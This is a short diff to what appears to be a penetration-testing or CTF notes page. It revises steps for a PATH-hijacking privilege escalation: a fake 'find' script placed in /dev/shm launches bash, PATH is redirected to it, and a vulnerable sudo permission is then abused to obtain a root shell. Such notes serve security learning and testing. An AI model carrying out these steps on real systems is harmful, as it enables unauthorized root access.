@@ -236,13 +236,11 @@ Navigate to globally writeable directory:
 cd /dev/shm
 ```
 
-Create malicious file using the find binary:
+Create malicious file using the name 'find' to masquerade as the `find` binary:
 
 find:
 
-<pre><code><strong>nano find
-</strong><strong>
-</strong><strong>#!/bin/bash
+<pre><code><strong>#!/bin/bash
 </strong>
 bash
 </code></pre>
@@ -256,7 +254,7 @@ export PATH=/dev/shm:$PATH
 chmod malicous to add executable bit:
 
 ```
-chmod +x malicious
+chmod +x find
 ```
 
 Use vulnerable sudo permissions to obtain new bash shell with sudo permissions granting root:
